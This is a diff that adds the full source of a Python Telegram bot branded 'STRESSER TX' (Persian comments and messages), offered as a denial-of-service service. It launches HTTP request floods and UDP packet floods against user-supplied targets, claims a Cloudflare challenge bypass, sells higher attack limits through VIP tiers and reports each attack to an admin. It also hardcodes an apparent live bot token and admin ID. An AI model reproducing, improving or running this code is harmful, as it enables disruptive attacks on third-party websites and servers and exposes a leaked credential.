@@ -1,0 +1,597 @@
+import telebot
+import threading
+import socket
+import requests
+import time
+import random
+from colorama import init, Fore
+import urllib.parse
+import json
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+import asyncio
+import aiohttp
+import os
+from datetime import datetime, timedelta
+
+init()
+
+# توکن ربات
+TOKEN = "7532194615:AAE3q6Uz3DSBZHj9x-vLJdzvd8M2M8KGQEY"  # توکن ربات
+bot = telebot.TeleBot(TOKEN)
+
+# آیدی ادمین (خودت)
+ADMIN_ID = "6596415015"  # آیدی عددی ادمین
+
+# لینک گروه برای هدایت کاربران
+GROUP_LINK = "https://t.me/+Dzray-5fpA9jMDU0"
+
+# بارگذاری لیست کاربران بن‌شده، VIP، بلاک‌شده‌ها، و سکوت‌ها از فایل
+BANNED_FILE = "banned_users.json"
+VIP_FILE = "vip_users.json"
+BLOCKED_URLS_FILE = "blocked_urls.json"
+MUTE_FILE = "muted_users.json"
+if os.path.exists(BANNED_FILE):
+    with open(BANNED_FILE, 'r') as f:
+        banned_users = set(json.load(f))
+else:
+    banned_users = set()
+
+if os.path.exists(VIP_FILE):
+    with open(VIP_FILE, 'r') as f:
+        vip_users = json.load(f)
+else:
+    vip_users = {}
+
+if os.path.exists(BLOCKED_URLS_FILE):
+    with open(BLOCKED_URLS_FILE, 'r') as f:
+        blocked_urls = set(json.load(f))
+else:
+    blocked_urls = set()
+
+if os.path.exists(MUTE_FILE):
+    with open(MUTE_FILE, 'r') as f:
+        muted_users = json.load(f)
+else:
+    muted_users = {}
+
+# دیکشنری برای Cool Down کاربران
+COOLDOWN_FILE = "cooldowns.json"
+if os.path.exists(COOLDOWN_FILE):
+    with open(COOLDOWN_FILE, 'r') as f:
+        cooldowns = json.load(f)
+else:
+    cooldowns = {}
+
+# ذخیره‌سازی فایل‌ها
+def save_banned_users():
+    with open(BANNED_FILE, 'w') as f:
+        json.dump(list(banned_users), f)
+
+def save_vip_users():
+    with open(VIP_FILE, 'w') as f:
+        json.dump(vip_users, f)
+
+def save_blocked_urls():
+    with open(BLOCKED_URLS_FILE, 'w') as f:
+        json.dump(list(blocked_urls), f)
+
+def save_muted_users():
+    with open(MUTE_FILE, 'w') as f:
+        json.dump(muted_users, f)
+
+def save_cooldowns():
+    with open(COOLDOWN_FILE, 'w') as f:
+        json.dump(cooldowns, f)
+
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
+]
+
+user_data = {}
+attack_threads = {}
+is_attacking = False  # متغیر برای چک کردن اتک در حال اجرا
+
+# تابع برای چک کردن عضویت یا ادمین بودن آیدی ادمین در گروه
+def is_admin_or_member(chat_id):
+    try:
+        chat_member = bot.get_chat_member(chat_id, int(ADMIN_ID))
+        if chat_member.status in ['creator', 'administrator', 'member']:
+            return True
+        else:
+            return False
+    except Exception as e:
+        print(f"Debug: Error checking admin/member status - {str(e)}")
+        return False
+
+def detect_protection(headers):
+    if 'cf-ray' in headers or 'cloudflare' in headers.get('server', '').lower():
+        return "Cloudflare"
+    elif 'ddos-guard' in headers.get('server', '').lower():
+        return "DDoS-Guard"
+    elif 'sucuri' in headers.get('server', '').lower():
+        return "Sucuri"
+    else:
+        return "Unknown"
+
+def check_status(target):
+    try:
+        start_time = time.time()
+        response = requests.get(target, timeout=5)
+        elapsed = (time.time() - start_time) * 1000
+        return f"🟢 Active - {elapsed:.2f}ms" if response.status_code == 200 else f"🟡 Unstable - Code: {response.status_code}"
+    except:
+        return "🔴 Down"
+
+async def async_layer7_attack(target, duration, rps, stop_event):
+    async with aiohttp.ClientSession() as session:
+        stop_time = time.time() + duration
+        headers = {"User-Agent": random.choice(user_agents)}
+        tasks = []
+
+        async def send_request():
+            while time.time() < stop_time and not stop_event.is_set():
+                try:
+                    await session.get(target, headers=headers)
+                except:
+                    pass
+
+        max_rps = 2970 if str(stop_event) not in [ADMIN_ID] and str(stop_event) not in vip_users else (vip_users.get(str(stop_event), {}).get('max_rps', 3300) if str(stop_event) in vip_users else 3300)
+        for _ in range(min(rps, max_rps)):
+            tasks.append(send_request())
+
+        await asyncio.gather(*tasks)
+
+def layer4_attack(target_ip, port, duration, rps, stop_event):
+    sent_packets = 0
+    stop_time = time.time() + duration
+    packet = random._urandom(1024)
+
+    def send_packet():
+        nonlocal sent_packets
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.setblocking(False)
+        while time.time() < stop_time and not stop_event.is_set():
+            try:
+                s.sendto(packet, (target_ip, port))
+                sent_packets += 1
+            except:
+                pass
+        s.close()
+
+    max_rps = 2970 if str(stop_event) not in [ADMIN_ID] and str(stop_event) not in vip_users else (vip_users.get(str(stop_event), {}).get('max_rps', 3300) if str(stop_event) in vip_users else 3300)
+    threads = []
+    for _ in range(min(rps, max_rps)):
+        t = threading.Thread(target=send_packet)
+        t.start()
+        threads.append(t)
+
+    for t in threads:
+        t.join()
+    return sent_packets
+
+async def bypass_cloudflare_uam(target, stop_event):
+    async with aiohttp.ClientSession() as session:
+        headers = {
+            "User-Agent": random.choice(user_agents),
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Upgrade-Insecure-Requests": "1"
+        }
+        try:
+            response = await session.get(target, headers=headers)
+            text = await response.text()
+            if "cloudflare" in text.lower() and "checking your browser" in text.lower():
+                js_challenge_url = f"{target}/cdn-cgi/challenge-platform/h/g/js"
+                await session.get(js_challenge_url, headers=headers)
+                await asyncio.sleep(4)
+                final_response = await session.get(target, headers=headers)
+                if final_response.status == 200:
+                    return True, "🟢 UAM Bypassed Successfully"
+                else:
+                    return False, "🔴 Failed to Bypass UAM"
+            else:
+                return True, "🟢 No UAM Detected"
+        except Exception as e:
+            return False, f"🔴 Error: {str(e)}"
+
+def update_status(chat_id, message_id, target, target_ip, layer, method, duration, rps, protection, stop_event):
+    remaining_time = duration
+    while remaining_time > 0 and not stop_event.is_set():
+        status = check_status(target) if layer == "L7" else "🟡 UDP - No ping"
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("Stop Attack", callback_data="stop_attack"))
+        bot.edit_message_text(chat_id=chat_id, message_id=message_id,
+                              text=f"🚀 Attack Running\nTarget: {target}\nIP: {target_ip}\nLayer: {layer}\nMethod: {method}\nDuration: {remaining_time}s\nRPS: {rps}\nProtection: {protection}\nStatus: {status}", reply_markup=markup)
+        time.sleep(3)
+        remaining_time -= 3
+    return remaining_time <= 0
+
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    user_id = str(message.from_user.id)
+    chat_id = message.chat.id
+    print(f"Debug: Received /start from user {user_id} in chat {chat_id} (type: {message.chat.type})")
+
+    # چک کردن Cool Down
+    if user_id != ADMIN_ID and user_id in cooldowns and time.time() < cooldowns[user_id]:
+        remaining = int(cooldowns[user_id] - time.time())
+        bot.reply_to(message, f"⏳ Cool Down {remaining}s")
+        return
+
+    # چک کردن اتک در حال اجرا
+    if is_attacking and message.chat.type in ['group', 'supergroup']:
+        bot.reply_to(message, "🚫 ربات مشغول به اتک است لطفاً صبر کنید!")
+        return
+
+    # اگه پیام توی چت خصوصی باشه و از ادمین نباشه
+    if user_id != ADMIN_ID and message.chat.type == 'private':
+        bot.reply_to(message, "🚫 برای استفاده از STRESSER TX باید به این گروه بری: " + GROUP_LINK)
+        return
+    
+    # اگه پیام از ادمین توی چت خصوصی باشه
+    if user_id == ADMIN_ID and message.chat.type == 'private':
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("Layer 7", callback_data="L7"),
+                   InlineKeyboardButton("Layer 4", callback_data="L4"))
+        bot.send_message(message.chat.id, "🔥 Welcome to DDoS API Bot\nSelect attack layer:", reply_markup=markup)
+        return
+    
+    # اگه پیام توی گروه باشه
+    if message.chat.type in ['group', 'supergroup']:
+        # چک کن که ادمین توی گروه باشه یا عضو باشه
+        if not is_admin_or_member(chat_id):
+            bot.reply_to(message, "🚫 برای استفاده از STRESSER TX باید به این گروه بری: " + GROUP_LINK)
+            bot.leave_chat(chat_id)
+            return
+        
+        # اگه ادمین یا عضو بود، ربات کار کنه
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("Layer 7", callback_data="L7"),
+                   InlineKeyboardButton("Layer 4", callback_data="L4"))
+        bot.send_message(chat_id, "🔥 Welcome to DDoS API Bot\nSelect attack layer:", reply_markup=markup)
+
+@bot.message_handler(commands=['ban'])
+def ban_user(message):
+    if str(message.from_user.id) != ADMIN_ID:
+        return
+    if len(message.text.split()) < 2:
+        bot.reply_to(message, "🚫 لطفاً آیدی کاربر را وارد کنید!\nمثال: `/ban 123456789`")
+        return
+    user_id = message.text.split()[1]
+    banned_users.add(user_id)
+    save_banned_users()
+    bot.reply_to(message, f"✅ کاربر با آیدی `{user_id}` با موفقیت بن شد (دائمی)!")
+
+@bot.message_handler(commands=['unban'])
+def unban_user(message):
+    if str(message.from_user.id) != ADMIN_ID:
+        return
+    if len(message.text.split()) < 2:
+        bot.reply_to(message, "🚫 لطفاً آیدی کاربر را وارد کنید!\nمثال: `/unban 123456789`")
+        return
+    user_id = message.text.split()[1]
+    if user_id in banned_users:
+        banned_users.remove(user_id)
+        save_banned_users()
+        bot.reply_to(message, f"✅ کاربر با آیدی `{user_id}` با موفقیت آن‌بان شد!")
+    else:
+        bot.reply_to(message, f"❌ کاربر با آیدی `{user_id}` بن نشده بود!")
+
+@bot.message_handler(commands=['vip'])
+def set_vip(message):
+    if str(message.from_user.id) != ADMIN_ID:
+        return
+    args = message.text.split()
+    if len(args) != 5:
+        bot.reply_to(message, "🚫 فرمت درست: `/vip <user_id> <days> <max_time> <max_rps>`\nمثال: `/vip 123456789 14 260 3300`")
+        return
+    user_id, days, max_time, max_rps = args[1], int(args[2]), int(args[3]), int(args[4])
+    expiration = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
+    vip_users[user_id] = {
+        "expiration": expiration,
+        "max_time": max_time,
+        "max_rps": max_rps
+    }
+    save_vip_users()
+    bot.reply_to(message, f"✅ کاربر با آیدی `{user_id}` به سطح VIP ارتقا یافت!\nمدت: {days} روز\nحداکثر زمان: {max_time}s\nحداکثر RPS: {max_rps}\nانقضا: {expiration}")
+
+@bot.message_handler(commands=['unvip'])
+def remove_vip(message):
+    if str(message.from_user.id) != ADMIN_ID:
+        return
+    if len(message.text.split()) < 2:
+        bot.reply_to(message, "🚫 لطفاً آیدی کاربر را وارد کنید!\nمثال: `/unvip 123456789`")
+        return
+    user_id = message.text.split()[1]
+    if user_id in vip_users:
+        del vip_users[user_id]
+        save_vip_users()
+        bot.reply_to(message, f"✅ اشتراک VIP کاربر با آیدی `{user_id}` حذف شد و به سطح رایگان بازگشت!")
+    else:
+        bot.reply_to(message, f"❌ کاربر با آیدی `{user_id}` VIP نیست!")
+
+@bot.message_handler(commands=['block'])
+def block_url(message):
+    if str(message.from_user.id) != ADMIN_ID:
+        return
+    args = message.text.split()
+    if len(args) < 2:
+        bot.reply_to(message, "🚫 فرمت درست: `/block <url>`\nمثال: `/block https://example.com`")
+        return
+    url = args[1]
+    blocked_urls.add(url)
+    save_blocked_urls()
+    bot.reply_to(message, f"✅ لینک `{url}` با موفقیت بلاک شد!")
+
+@bot.callback_query_handler(func=lambda call: True)
+def handle_callback(call):
+    chat_id = call.message.chat.id
+    user_id = str(call.from_user.id)
+    if user_id in banned_users:
+        bot.answer_callback_query(call.id, "🚫 شما بن شده‌اید و نمی‌توانید از ربات استفاده کنید!")
+        return
+    if call.message.chat.type in ['group', 'supergroup'] and not is_admin_or_member(chat_id):
+        bot.answer_callback_query(call.id, "🚫 برای استفاده از STRESSER TX باید به این گروه بری: " + GROUP_LINK)
+        return
+    if call.data in ["L7", "L4"]:
+        user_data[chat_id] = {"layer": call.data, "step": "awaiting_method"}
+        markup = InlineKeyboardMarkup()
+        if call.data == "L7":
+            markup.add(InlineKeyboardButton("HTTPS", callback_data="HTTPS"),
+                       InlineKeyboardButton("Bypass UAM", callback_data="BYPASS_UAM"))
+        else:
+            markup.add(InlineKeyboardButton("UDP", callback_data="UDP"))
+        markup.add(InlineKeyboardButton("Back", callback_data="back_to_start"))
+        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
+                              text=f"✅ Layer {call.data} selected\nSelect attack method:", reply_markup=markup)
+    elif call.data == "back_to_start":
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("Layer 7", callback_data="L7"),
+                   InlineKeyboardButton("Layer 4", callback_data="L4"))
+        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
+                              text="🔥 Welcome to DDoS API Bot\nSelect attack layer:", reply_markup=markup)
+        if chat_id in user_data:
+            del user_data[chat_id]
+    elif call.data in ["HTTPS", "UDP", "BYPASS_UAM"]:
+        user_data[chat_id]["method"] = call.data
+        user_data[chat_id]["step"] = "awaiting_host"
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("Back", callback_data="back_to_start"))
+        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
+                              text="✅ Method selected\nEnter target host (e.g., https://example.com):", reply_markup=markup)
+    elif call.data == "stop_attack":
+        stop_attack(chat_id, call.message.message_id)
+
+@bot.message_handler(func=lambda message: True)
+def handle_steps(message):
+    chat_id = message.chat.id
+    user_id = str(message.from_user.id)
+    if user_id in banned_users:
+        bot.reply_to(message, "🚫 شما بن شده‌اید و نمی‌توانید از ربات استفاده کنید!")
+        return
+    if chat_id not in user_data or "step" not in user_data[chat_id]:
+        return
+    if message.chat.type in ['group', 'supergroup'] and not is_admin_or_member(chat_id):
+        bot.reply_to(message, "🚫 برای استفاده از STRESSER TX باید به این گروه بری: " + GROUP_LINK)
+        return
+
+    step = user_data[chat_id]["step"]
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("Back", callback_data="back_to_start"))
+
+    if step == "awaiting_host":
+        target = message.text
+        targets_to_check = [target, urllib.parse.urlparse(target).netloc] if '://' in target else [target]
+        if any(t in blocked_urls for t in targets_to_check):
+            bot.reply_to(message, "🚫 لینک در لیست بلاک قرار گرفته!")
+            return
+        if not target.startswith("http") and user_data[chat_id]["layer"] == "L7":
+            target = "http://" + target
+        user_data[chat_id]["host"] = target
+        user_data[chat_id]["step"] = "awaiting_duration"
+        bot.reply_to(message, "⏳ Enter attack duration (seconds):", reply_markup=markup)
+
+    elif step == "awaiting_duration":
+        try:
+            duration = int(message.text)
+            if user_id != ADMIN_ID and user_id not in vip_users and message.chat.type in ['group', 'supergroup']:
+                if duration > 60:
+                    duration = 60
+                    bot.reply_to(message, "⚠️ حداکثر زمان مجاز برای کاربران عادی 60 ثانیه است! زمان به 60 تنظیم شد.")
+            elif user_id in vip_users and message.chat.type in ['group', 'supergroup']:
+                if datetime.now() > datetime.strptime(vip_users[user_id]["expiration"], "%Y-%m-%d %H:%M:%S"):
+                    del vip_users[user_id]
+                    save_vip_users()
+                    if duration > 60:
+                        duration = 60
+                        bot.reply_to(message, "⚠️ اشتراک VIP شما منقضی شده است! حداکثر زمان به 60 ثانیه تنظیم شد.")
+                else:
+                    if duration > vip_users[user_id]["max_time"]:
+                        duration = vip_users[user_id]["max_time"]
+                        bot.reply_to(message, f"⚠️ حداکثر زمان مجاز برای VIP {vip_users[user_id]['max_time']} ثانیه است! زمان به {duration} تنظیم شد.")
+            user_data[chat_id]["duration"] = duration
+            user_data[chat_id]["step"] = "awaiting_rps"
+            bot.reply_to(message, f"⏱ Duration set to {duration}s\nEnter requests per second (RPS, max 2970 or VIP limit):", reply_markup=markup)
+        except ValueError:
+            bot.reply_to(message, "❌ Invalid duration! Enter a number:", reply_markup=markup)
+
+    elif step == "awaiting_rps":
+        try:
+            rps = int(message.text)
+            if user_id != ADMIN_ID and user_id not in vip_users and message.chat.type in ['group', 'supergroup']:
+                if rps > 2970:
+                    rps = 2970
+                    bot.reply_to(message, "⚠️ حداکثر RPS مجاز برای کاربران عادی 2970 است! RPS به 2970 تنظیم شد.")
+            elif user_id in vip_users and message.chat.type in ['group', 'supergroup']:
+                if datetime.now() > datetime.strptime(vip_users[user_id]["expiration"], "%Y-%m-%d %H:%M:%S"):
+                    del vip_users[user_id]
+                    save_vip_users()
+                    if rps > 2970:
+                        rps = 2970
+                        bot.reply_to(message, "⚠️ اشتراک VIP شما منقضی شده است! حداکثر RPS به 2970 تنظیم شد.")
+                else:
+                    if rps > vip_users[user_id]["max_rps"]:
+                        rps = vip_users[user_id]["max_rps"]
+                        bot.reply_to(message, f"⚠️ حداکثر RPS مجاز برای VIP {vip_users[user_id]['max_rps']} است! RPS به {rps} تنظیم شد.")
+            if 1 <= rps:
+                user_data[chat_id]["rps"] = rps
+                if user_data[chat_id]["layer"] == "L4":
+                    user_data[chat_id]["step"] = "awaiting_port"
+                    bot.reply_to(message, "🔌 Enter port (1-65535):", reply_markup=markup)
+                else:
+                    start_attack(chat_id, user_id)
+            else:
+                raise ValueError
+        except ValueError:
+            bot.reply_to(message, "❌ Invalid RPS! Enter a number between 1-2970 (یا بیشتر برای VIP/ادمین):", reply_markup=markup)
+
+    elif step == "awaiting_port":
+        try:
+            port = int(message.text)
+            if 1 <= port <= 65535:
+                user_data[chat_id]["port"] = port
+                start_attack(chat_id, user_id)
+            else:
+                raise ValueError
+        except ValueError:
+            bot.reply_to(message, "❌ Invalid port! Enter a number between 1-65535:", reply_markup=markup)
+
+def start_attack(chat_id, user_id):
+    global is_attacking
+    user_id = str(user_id)
+    if user_id in banned_users:
+        bot.send_message(chat_id, "🚫 شما بن شده‌اید و نمی‌توانید از ربات استفاده کنید!")
+        return
+    if chat_id not in user_data:
+        return
+
+    is_attacking = True  # شروع اتک، ربات مشغول می‌شه
+
+    target = user_data[chat_id]["host"]
+    duration = user_data[chat_id]["duration"]
+    rps = user_data[chat_id]["rps"]
+    method = user_data[chat_id]["method"]
+    layer = user_data[chat_id]["layer"]
+
+    stop_event = threading.Event()
+    attack_threads[chat_id] = stop_event
+
+    if layer == "L7":
+        parsed_url = urllib.parse.urlparse(target)
+        host = parsed_url.hostname
+        target_ip = socket.gethostbyname(host)
+        if method == "BYPASS_UAM":
+            attack_func = bypass_cloudflare_uam
+            args = (target, stop_event)
+            is_async = True
+        else:
+            attack_func = async_layer7_attack
+            args = (target, duration, rps, stop_event)
+            is_async = True
+    else:
+        target_ip = socket.gethostbyname(target.split("://")[1].split("/")[0] if "://" in target else target)
+        port = user_data[chat_id].get("port", 80)
+        attack_func = layer4_attack
+        args = (target_ip, port, duration, rps, stop_event)
+        is_async = False
+
+    attack_info = f"⚠️ New Attack Launched\nUser ID: {user_id}\nTarget: {target}\nIP: {target_ip}\nLayer: {layer}\nMethod: {method}\nDuration: {duration}s\nRPS: {rps}"
+    if layer == "L4":
+        attack_info += f"\nPort: {port}"
+    bot.send_message(ADMIN_ID, attack_info)
+
+    initial_status = check_status(target) if layer == "L7" else "🟡 UDP - No ping"
+    protection = detect_protection(requests.get(target, headers={"User-Agent": random.choice(user_agents)}).headers) if layer == "L7" else "Unknown"
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("Stop Attack", callback_data="stop_attack"))
+    result_msg = bot.send_message(chat_id, f"🚀 Attack Started\nUser ID: {user_id}\nTarget: {target}\nIP: {target_ip}\nLayer: {layer}\nMethod: {method}\nDuration: {duration}s\nRPS: {rps}\nProtection: {protection}\nStatus: {initial_status}", reply_markup=markup)
+
+    if is_async:
+        if method == "BYPASS_UAM":
+            bypass_task = threading.Thread(target=lambda: asyncio.run(attack_func(*args)))
+            bypass_task.start()
+            bypass_task.join()
+            success, bypass_status = asyncio.run(bypass_cloudflare_uam(target, stop_event))
+            bot.edit_message_text(chat_id=chat_id, message_id=result_msg.message_id,
+                                  text=f"🚀 Bypass UAM Result\nTarget: {target}\nIP: {target_ip}\nStatus: {bypass_status}\nThanks to: @TEXOAR & Grok 3")
+        else:
+            attack_task = threading.Thread(target=lambda: asyncio.run(attack_func(*args)))
+            attack_task.start()
+            status_thread = threading.Thread(target=update_status, args=(chat_id, result_msg.message_id, target, target_ip, layer, method, duration, rps, protection, stop_event))
+            status_thread.start()
+
+            attack_task.join()
+            status_thread.join()
+    else:
+        attack_task = threading.Thread(target=attack_func, args=args)
+        attack_task.start()
+        status_thread = threading.Thread(target=update_status, args=(chat_id, result_msg.message_id, target, target_ip, layer, method, duration, rps, protection, stop_event))
+        status_thread.start()
+
+        attack_task.join()
+        status_thread.join()
+
+    is_attacking = False  # اتمام اتک
+
+    # اعمال Cool Down در هر شرایط (اتمام یا لغو)
+    if user_id != ADMIN_ID:
+        cooldowns[user_id] = time.time() + 60
+        save_cooldowns()
+        bot.send_message(chat_id, "⏳ Cool Down 60s اعمال شد!")
+
+    if not stop_event.is_set() and method != "BYPASS_UAM":
+        final_status = check_status(target) if layer == "L7" else "🟡 UDP - No ping"
+        final_message = f"✅ Attack Success\nTarget: {target}\nIP: {target_ip}\nLayer: {layer}\nMethod: {method}\nDuration: 0s\nRPS: {rps}\nProtection: {protection}\nStatus: {final_status}\nThanks to: @TEXOAR & Grok 3\nاتک تموم شد، حالا بریم چای بخوریم! 😂"
+        bot.edit_message_text(chat_id=chat_id, message_id=result_msg.message_id, text=final_message)
+    elif stop_event.is_set() and method != "BYPASS_UAM":
+        bot.edit_message_text(chat_id=chat_id, message_id=result_msg.message_id,
+                              text=f"⛔ Attack Stopped\nTarget: {target}\nIP: {target_ip}\nLayer: {layer}\nMethod: {method}\nRPS: {rps}\nThanks to: @TEXOAR & Grok 3")
+
+    if chat_id in attack_threads:
+        del attack_threads[chat_id]
+    if method != "BYPASS_UAM":
+        del user_data[chat_id]
+
+def stop_attack(chat_id, message_id):
+    if chat_id in attack_threads:
+        attack_threads[chat_id].set()
+        target = user_data[chat_id]["host"]
+        target_ip = socket.gethostbyname(urllib.parse.urlparse(target).hostname if "://" in target else target)
+        bot.edit_message_text(chat_id=chat_id, message_id=message_id,
+                              text=f"⛔ Attack Stopped\nTarget: {target}\nIP: {target_ip}\nLayer: {user_data[chat_id]['layer']}\nMethod: {user_data[chat_id]['method']}\nRPS: {user_data[chat_id]['rps']}\nThanks to: @TEXOAR & Grok 3")
+
+# چک سکوت کاربران
+@bot.message_handler(content_types=['text', 'photo', 'video', 'audio', 'document', 'sticker', 'voice', 'video_note', 'contact', 'location', 'venue', 'poll', 'dice', 'new_chat_members', 'left_chat_member', 'new_chat_title', 'new_chat_photo', 'delete_chat_photo', 'group_chat_created', 'supergroup_chat_created', 'channel_chat_created', 'migrate_to_chat_id', 'migrate_from_chat_id', 'pinned_message'])
+def check_mute(message):
+    user_id = str(message.from_user.id)
+    if user_id in muted_users and time.time() < muted_users[user_id]:
+        return
+    elif user_id in muted_users and time.time() >= muted_users[user_id]:
+        del muted_users[user_id]
+        save_muted_users()
+        if message.chat.type in ['group', 'supergroup']:
+            bot.restrict_chat_member(message.chat.id, int(user_id), can_send_messages=True)
+
+# شروع ربات با دیباگ خطاها
+def handle_exceptions(exc_type, exc_value, exc_traceback):
+    print(f"{Fore.RED}Error occurred: {exc_type.__name__} - {exc_value}{Fore.RESET}")
+
+import sys
+sys.excepthook = handle_exceptions
+
+# ریست آپدیت‌ها برای جلوگیری از تعارض
+def clear_updates():
+    try:
+        bot.get_updates(offset=-1)
+        print(f"{Fore.GREEN}Old updates cleared successfully!{Fore.RESET}")
+    except Exception as e:
+        print(f"{Fore.YELLOW}Warning: Could not clear updates - {str(e)}{Fore.RESET}")
+
+print(f"{Fore.MAGENTA}DDoS API Bot Started!{Fore.RESET}")
+clear_updates()
+try:
+    bot.polling(none_stop=True, allowed_updates=telebot.util.update_types)
+except Exception as e:
+    print(f"{Fore.RED}Polling Error: {str(e)}{Fore.RESET}")
